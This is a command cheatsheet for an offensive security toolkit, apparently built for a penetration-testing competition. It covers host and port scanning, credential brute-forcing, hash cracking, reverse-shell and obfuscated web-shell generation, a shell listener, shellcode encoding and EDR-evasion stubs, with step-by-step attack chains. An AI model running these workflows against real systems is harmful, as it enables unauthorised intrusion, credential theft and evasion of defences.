# Tool Commands Cheatsheet

Quick reference for all CPTC toolkit commands.

---

## Universal Options

All tools support these common flags:

| Flag | Description |
|------|-------------|
| `--plan` / `-p` | Preview operation without execution |
| `--verbose` / `-v` | Enable detailed output |
| `--output` / `-o` | Save results to JSON file |
| `--help` / `-h` | Show help message |

---

## Network Scanner

**Location**: `tools/network-scanner/tool.py`

### Quick Commands

```bash
# Basic host discovery
python3 tool.py 192.168.1.0/24

# Discovery with multiple methods
python3 tool.py 192.168.1.0/24 --methods tcp dns --ports 22,80,443,445

# Stealthy scan
python3 tool.py 192.168.1.0/24 --delay-min 2 --delay-max 5 --threads 2

# Save results
python3 tool.py 192.168.1.0/24 --output results.json
```

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `targets` | Required | IP, CIDR, or range (e.g., 192.168.1.1-50) |
| `--methods` / `-m` | tcp | Scan methods: tcp, arp, dns |
| `--ports` / `-P` | 80,443,22 | TCP ports for connect scan |
| `--timeout` / `-t` | 2.0 | Connection timeout (seconds) |
| `--threads` / `-T` | 10 | Concurrent threads |
| `--delay-min` | 0.0 | Min delay between probes |
| `--delay-max` | 0.1 | Max delay between probes |
| `--resolve` / `-r` | False | Resolve hostnames |

---

## Port Scanner

**Location**: `tools/port-scanner/tool.py`

### Quick Commands

```bash
# Scan top 20 ports
python3 tool.py 192.168.1.1

# Scan specific ports
python3 tool.py 192.168.1.1 --ports 22,80,443,8080

# Scan port range
python3 tool.py 192.168.1.1 --ports 1-1024

# Full port scan (fast)
python3 tool.py 192.168.1.1 --ports all --threads 200

# Banner grabbing
python3 tool.py 192.168.1.1 --ports top100 --banner
```

### Port Specifications

| Format | Example | Description |
|--------|---------|-------------|
| Single | `80` | Single port |
| Range | `1-1024` | Port range |
| List | `22,80,443` | Multiple ports |
| Preset | `top20`, `top100`, `all` | Predefined sets |

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `target` | Required | Target IP or hostname |
| `--ports` / `-P` | top20 | Port specification |
| `--scan-type` / `-s` | connect | Type: connect, syn, udp |
| `--banner` / `-b` | False | Grab service banners |
| `--threads` / `-T` | 50 | Concurrent threads |
| `--timeout` / `-t` | 1.0 | Connection timeout |
| `--no-randomize` | False | Disable port randomization |

---

## Service Fingerprinter

**Location**: `tools/service-fingerprinter/tool.py`

### Quick Commands

```bash
# Fingerprint ports
python3 tool.py 192.168.1.1 --ports 22,80,443

# Aggressive mode
python3 tool.py 192.168.1.1 --ports 22,80,8080 --aggressive

# Skip SSL detection
python3 tool.py 192.168.1.1 --ports 80,8080 --no-ssl
```

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `target` | Required | Target IP or hostname |
| `--ports` / `-P` | Required | Ports to fingerprint |
| `--aggressive` / `-a` | False | Try all probes |
| `--no-ssl` | False | Skip SSL detection |
| `--timeout` / `-t` | 5.0 | Connection timeout |
| `--threads` / `-T` | 10 | Concurrent threads |

---

## DNS Enumerator

**Location**: `tools/dns-enumerator/tool.py`

### Quick Commands

```bash
# Basic enumeration
python3 tool.py example.com

# Zone transfer attempt
python3 tool.py example.com --zone-transfer

# Custom nameserver
python3 tool.py example.com -n 8.8.8.8

# Custom wordlist
python3 tool.py example.com -w subdomains.txt

# Specific record types
python3 tool.py example.com -r A,MX,TXT,NS
```

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `domain` | Required | Target domain |
| `--nameserver` / `-n` | System | DNS server |
| `--wordlist` / `-w` | Built-in | Subdomain wordlist |
| `--record-types` / `-r` | A,AAAA,CNAME | Record types |
| `--zone-transfer` / `-z` | False | Attempt AXFR |
| `--no-brute` | False | Disable bruteforce |
| `--threads` / `-t` | 10 | Concurrent threads |

---

## SMB Enumerator

**Location**: `tools/smb-enumerator/tool.py`

### Quick Commands

```bash
# Null session enumeration
python3 tool.py 192.168.1.1

# Authenticated enumeration
python3 tool.py 192.168.1.1 -u admin -P password -d DOMAIN

# Skip share enumeration
python3 tool.py 192.168.1.1 --no-shares
```

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `target` | Required | Target IP |
| `--port` | 445 | SMB port |
| `--username` / `-u` | None | Username |
| `--password` / `-P` | None | Password |
| `--domain` / `-d` | None | Domain name |
| `--null-session` / `-n` | True | Try null session |
| `--no-shares` | False | Skip share enum |

---

## Credential Validator

**Location**: `tools/credential-validator/tool.py`

### Quick Commands

```bash
# Single credential
python3 tool.py 192.168.1.1 --protocol ftp -u admin -P password

# Credential file
python3 tool.py 192.168.1.1 --protocol ftp -c creds.txt

# HTTP Basic Auth
python3 tool.py 192.168.1.1 --protocol http-basic --http-path /admin -c creds.txt

# HTTP Form Auth
python3 tool.py 192.168.1.1 --protocol http-form \
    --http-path /login.php \
    --http-user-field username \
    --http-pass-field password \
    --http-success "Welcome" \
    -c creds.txt

# Stop on first valid
python3 tool.py 192.168.1.1 --protocol ftp -c creds.txt --stop-on-success
```

### Supported Protocols

| Protocol | Port | Command Option |
|----------|------|----------------|
| FTP | 21 | `--protocol ftp` |
| HTTP Basic | 80/443 | `--protocol http-basic` |
| HTTP Form | 80/443 | `--protocol http-form` |
| SMTP | 25 | `--protocol smtp` |

---

## Hash Cracker

**Location**: `tools/hash-cracker/tool.py`

### Quick Commands

```bash
# Single hash with wordlist
python3 tool.py 5f4dcc3b5aa765d61d8327deb882cf99 -w wordlist.txt

# Multiple hashes from file
python3 tool.py -f hashes.txt -w rockyou.txt

# With rules
python3 tool.py -f hashes.txt -w words.txt -r capitalize,append_numbers

# Bruteforce
python3 tool.py HASH -b -c lowercase --max-length 6
```

### Hash Types

| Type | Length | Auto-detected |
|------|--------|---------------|
| MD5 | 32 | Yes |
| SHA1 | 40 | Yes |
| SHA256 | 64 | Yes |
| NTLM | 32 | By format |

### Available Rules

| Rule | Effect |
|------|--------|
| `capitalize` | word -> Word |
| `uppercase` | word -> WORD |
| `reverse` | word -> drow |
| `append_numbers` | word -> word0-99 |
| `append_year` | word -> word2020-2026 |
| `leet` | word -> w0rd |

---

## Payload Generator

**Location**: `tools/payload-generator/payload_generator.py`

### Quick Commands

```bash
# List available payloads
python3 payload_generator.py --list

# Python reverse shell
python3 payload_generator.py --type reverse_shell --lang python --lhost 10.0.0.1

# PowerShell with encoding
python3 payload_generator.py --type reverse_shell --lang powershell --lhost 10.0.0.1 --encoding base64

# Obfuscated PHP web shell
python3 payload_generator.py --type web_shell --lang php --obfuscate 2

# JSON output
python3 payload_generator.py --type reverse_shell --lang bash --lhost 10.0.0.1 --json
```

### Payload Types and Languages

| Type | Languages |
|------|-----------|
| `reverse_shell` | python, powershell, bash, php |
| `bind_shell` | python |
| `web_shell` | php |

### Options Reference

| Option | Description |
|--------|-------------|
| `--type` / `-t` | Payload type |
| `--lang` / `-l` | Target language |
| `--lhost` | Listener IP (for reverse shells) |
| `--lport` | Listener port (default: 4444) |
| `--encoding` / `-e` | Encoding: base64, hex |
| `--obfuscate` / `-o` | Obfuscation level 0-3 |

---

## Reverse Shell Handler

**Location**: `tools/reverse-shell-handler/tool.py`

### Quick Commands

```bash
# Basic listener
python3 tool.py -l 4444

# SSL listener
python3 tool.py -l 443 --ssl

# Multi-session mode
python3 tool.py -l 4444 --multi

# Show payloads
python3 tool.py --payloads -H 10.0.0.1 -l 4444
```

### Options Reference

| Option | Default | Description |
|--------|---------|-------------|
| `--host` / `-H` | 0.0.0.0 | Listen address |
| `--port` / `-l` | 4444 | Listen port |
| `--ssl` / `-s` | False | Enable SSL |
| `--multi` / `-m` | False | Multi-session |
| `--payloads` | False | Show payloads |

---

## Shellcode Encoder

**Location**: `tools/shellcode-encoder/shellcode_encoder.py`

### Quick Commands

```bash
# XOR encode
python3 shellcode_encoder.py -i shellcode.bin -e xor

# Chain encode
python3 shellcode_encoder.py -i shellcode.bin --chain xor,add,rot

# Custom output format
python3 shellcode_encoder.py -i shellcode.bin -e xor -f python

# Analyze shellcode
python3 shellcode_encoder.py -i shellcode.bin --analyze

# Avoid bad characters
python3 shellcode_encoder.py -i shellcode.bin -e xor --null-free --bad-chars 000a0d
```

### Encoders

| Encoder | Description |
|---------|-------------|
| `xor` | Simple XOR |
| `xor_rolling` | Rolling XOR |
| `add` | ADD encoding |
| `rot` | ROT/Caesar |
| `rc4` | RC4 encryption |
| `base64` | Base64 |

### Output Formats

| Format | Description |
|--------|-------------|
| `raw` | Raw hex string |
| `hex` | Escaped hex |
| `c_array` | C array |
| `python` | Python bytes |
| `powershell` | PS byte array |
| `csharp` | C# byte array |

---

## EDR Evasion Toolkit

**Location**: `tools/edr-evasion-toolkit/edr_evasion.py`

### Quick Commands

```bash
# List techniques
python3 edr_evasion.py --list

# Explore technique
python3 edr_evasion.py --technique direct_syscalls --plan

# List syscalls
python3 edr_evasion.py --list-syscalls

# Syscall info
python3 edr_evasion.py --syscall NtAllocateVirtualMemory

# Generate syscall stubs
python3 edr_evasion.py --generate-stubs NtAllocateVirtualMemory,NtWriteVirtualMemory

# API hashing
python3 edr_evasion.py --hash-apis VirtualAlloc,CreateThread
```

### Options Reference

| Option | Description |
|--------|-------------|
| `--technique` / `-t` | Technique to explore |
| `--list` / `-l` | List techniques |
| `--category` / `-c` | Filter by category |
| `--syscall` / `-s` | Syscall info |
| `--list-syscalls` | List all syscalls |
| `--generate-stubs` | Generate assembly stubs |
| `--hash-apis` | Generate API hashes |
| `--platform` | Target platform |

---

## Common Workflows

### Quick Network Recon

```bash
# 1. Host discovery
python3 network-scanner/tool.py 10.10.10.0/24 -o hosts.json

# 2. Port scan discovered hosts
python3 port-scanner/tool.py <target> --ports top100 --banner

# 3. Fingerprint services
python3 service-fingerprinter/tool.py <target> --ports <ports> --aggressive
```

### Credential Attack Chain

```bash
# 1. Validate found credentials
python3 credential-validator/tool.py <target> --protocol ftp -c creds.txt

# 2. Crack hashes
python3 hash-cracker/tool.py -f hashes.txt -w wordlist.txt -r capitalize,append_numbers

# 3. Test credential reuse
python3 credential-validator/tool.py <target2> --protocol smb -c valid_creds.txt
```

### Payload Deployment

```bash
# 1. Start handler
python3 reverse-shell-handler/tool.py -l 4444 &

# 2. Generate payload
python3 payload-generator/payload_generator.py --type reverse_shell --lang bash --lhost <your_ip>

# 3. Encode if needed
python3 shellcode-encoder/shellcode_encoder.py -i payload.bin -e xor -f python
```

---

## Emergency Quick Reference

### I need to find live hosts
```bash
python3 network-scanner/tool.py <range> --methods tcp --ports 22,80,443,445
```

### I need to scan all ports fast
```bash
python3 port-scanner/tool.py <target> --ports all --threads 200
```

### I need a reverse shell
```bash
python3 payload-generator/payload_generator.py --type reverse_shell --lang <python|bash|powershell> --lhost <your_ip>
```

### I need to crack a hash
```bash
python3 hash-cracker/tool.py <hash> -w /path/to/wordlist.txt
```

### I need to test credentials
```bash
python3 credential-validator/tool.py <target> --protocol <ftp|http-basic|smtp> -u <user> -P <pass>
```
